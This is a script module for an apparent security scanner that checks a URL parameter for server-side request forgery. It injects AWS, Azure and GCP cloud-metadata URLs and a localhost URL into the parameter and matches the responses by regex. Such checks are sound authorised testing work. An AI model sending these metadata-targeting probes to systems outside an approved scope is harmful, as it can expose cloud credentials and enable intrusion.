// check-ssrf.rhai — operator/agent command `check.ssrf { url, param }`: confirm
// server-side request forgery by pointing a URL parameter at cloud-metadata and
// internal endpoints and matching their in-band responses. OWASP A10 SSRF.
//
// ACTIVE: scope-/rate-gated GETs to the IN-SCOPE target (the SSRF target rides
// in the parameter), invoked only. For authorised testing only.
const NAME = "check-ssrf";
const API  = "1";

fn q(url, param, value) {
    let sep = if url.contains("?") { "&" } else { "?" };
    `${url}${sep}${url_encode(param)}=${url_encode(value)}`
}

fn load(reg) {
    reg.add_command("check.ssrf", "Confirm SSRF in { url, param } via metadata/internal targets", |args| {
        if type_of(args.url) != "string" || type_of(args.param) != "string" {
            return "usage: check.ssrf { url, param }";
        }
        // target -> a signature its response carries.
        let probes = [
            ["http://169.254.169.254/latest/meta-data/", "(?i)(ami-id|instance-id|iam/|hostname|public-keys)"],
            ["http://metadata.google.internal/computeMetadata/v1/", "(?i)(computeMetadata|project-id|instance/)"],
            ["http://169.254.169.254/metadata/instance?api-version=2021-02-01", "(?i)(compute|azEnvironment|subscriptionId)"],
            ["http://127.0.0.1/", "(?i)(<title>|server:|apache|nginx|it works)"],
        ];
        for pr in probes {
            let r = http.send(#{ method: "GET", url: q(args.url, args.param, pr[0]) });
            if r.status == () { continue; }
            if regex_match(pr[1], r.body) {
                finding(#{
                    name: "Server-Side Request Forgery (SSRF)",
                    severity: "critical",
                    flow_id: r.flow_id,
                    detail: `\"${args.param}\" on ${args.url} fetched an internal/metadata target (${pr[0]}) and returned its response. Cloud-metadata SSRF can leak credentials.`,
                    tags: ["ssrf", "active", "owasp-a10"],
                });
                return "VULNERABLE: SSRF confirmed";
            }
        }
        "no SSRF confirmed"
    });
}
